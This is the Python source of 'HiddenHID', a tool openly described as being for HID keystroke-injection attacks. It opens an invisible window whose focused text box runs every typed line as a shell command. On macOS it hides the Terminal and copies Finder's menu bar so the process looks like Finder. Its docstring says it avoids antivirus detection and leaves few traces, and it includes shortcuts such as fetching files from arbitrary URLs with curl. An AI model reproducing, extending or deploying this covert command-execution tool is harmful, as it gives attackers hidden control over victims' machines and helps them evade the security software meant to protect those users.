"""
HiddenHID by BrightShard
------------------------
This app makes an invisible window with a text box, then focuses the text box. Any command typed into the text box will
be run in the terminal via the Python subprocess library. It's intended for HID attacks, so commands can be run in
the command prompt or terminal without the target noticing anything on screen. It's also cross-platform, supporting
macOS and Windows, along with limited Linux support. Some shortcut commands are also built into the app to automate
some tasks. More information in the README file.

Why not just use a keylogger?
-----------------------------
Keyloggers tend to be permanent and detected by AVs. This app just uses a textfield and the Python subprocess library
to run commands, and can clean up after itself without leaving logs (unless one of the commands creates/modifies a
file). That means that this app isn't as likely to be detected by AVs because of that.
"""

# For the invisible GUI
from tkinter import Tk, Entry, Menu
# Run commands in a shell
from subprocess import run as shell
# For enabling debug
from sys import argv
# Get host OS
from platform import system as os


class App(Tk):
    """
    The invisible app that runs terminal commands
    """
    def __init__(self):
        # Store host OS
        self.os = os()
        # Hide the terminal right off the bat on macOS, since it's visible when the program launches
        # Also make sure "visible" or "vis" wasn't passed as an argument
        if self.os == "Darwin" and "vis" not in argv and "visible" not in argv:
            shell('osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
                  shell=True, check=False)

        # Actually set up Tkinter
        super().__init__()
        # Shortcut commands
        self.shortcuts = {
            'Darwin': {
                'wallpaper': 'curl -o "/tmp/wallpaper" "{args[0]}"; osascript -e \'tell application\
                     "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'; rm\
                     /tmp/wallpaper',
                'volume': 'osascript -e \'set Volume {args[0]}\'',
                'mute': 'osascript -e \'set Volume 0\''
            }
        }

        # If 'visible' is not passed as an argument, make the window invisible
        if "vis" not in argv and "visible" not in argv:
            self.attributes('-alpha', 0)

        # Commands are typed into the entry box
        self.entry = Entry(self)
        # Add it to the window
        self.entry.pack()
        # Focus the entry box so the keyboard types into it
        self.entry.focus()
        # Bind the enter key to run the command
        self.entry.bind('<Enter>', self.run_command)
        # It's the return key on some devices, so bind that too
        self.entry.bind('<Return>', self.run_command)

        # If debug is passed as an argument, enable debug mode, otherwise disable it
        if "debug" in argv:
            # Show debug mode is enabled
            print("Debug mode enabled")
            # Enable debug mode
            self.debug = True
        else:
            # Disable debug mode
            self.debug = False

        # On macOS, toolbars still show for invisible apps
        # This clones the toolbar from Finder, so it looks like Finder is open
        # Just make sure the file is named "Finder" so that's what is displayed as the app name
        if self.os == "Darwin":
            # The app toolbar
            menu = Menu(self)
            # Blank menu for each toolbar item
            # Programming in each toolbar action is just too much effort lol
            submenu = Menu(menu, tearoff=0)
            # Each of the toolbar menus in Finder, cloned here
            menu.add_cascade(label="File", menu=submenu)
            menu.add_cascade(label="Edit", menu=submenu)
            menu.add_cascade(label="View", menu=submenu)
            menu.add_cascade(label="Go", menu=submenu)
            menu.add_cascade(label="Window", menu=submenu)
            menu.add_cascade(label="Help", menu=submenu)
            self.config(menu=menu)

    def run_command(self, *args, **kwargs):
        """
        When 'enter' is pressed, run the command in Subprocess
        The command is taken from the entry widget's text, then the entry widget is cleared
        """
        # Get the text box contents to get the command
        command = self.entry.get()

        # If it's blank, don't even process the command
        if command == '':
            return

        # Debug
        if self.debug:
            print(f"Running command '{command}'")

        # Exit if the command is 'exit'
        if command == "exit":
            self.quit()

        # Split the command up to get the arguments
        splitCommand = self.entry.get().split(' ')

        # Make the command a shortcut if it's a shortcut
        if splitCommand[0] in self.shortcuts:
            # Print that a shortcut was detected
            if self.debug:
                print('-> Shortcut detected! Converting the command to shortcut...')
            # Convert the command to its shortcut
            command = self.shortcuts[splitCommand[0]].format(args=splitCommand[1:])

        # Run the command
        shell(command, shell=True, check=False)

        # Clear the command input
        self.entry.delete(0, len(self.entry.get()))
        # Print a new line for a separator between command outputs
        print('')

    def quit(self):
        """
        Quit the app and close any open terminals
        """
        print("-> Goodbye")
        # On macOS, use the killall command to close all terminals
        # Make sure no terminals are open and running key processes before closing them this way!
        if self.os == 'Darwin':
            shell('killall Terminal', shell=True)


App().mainloop()
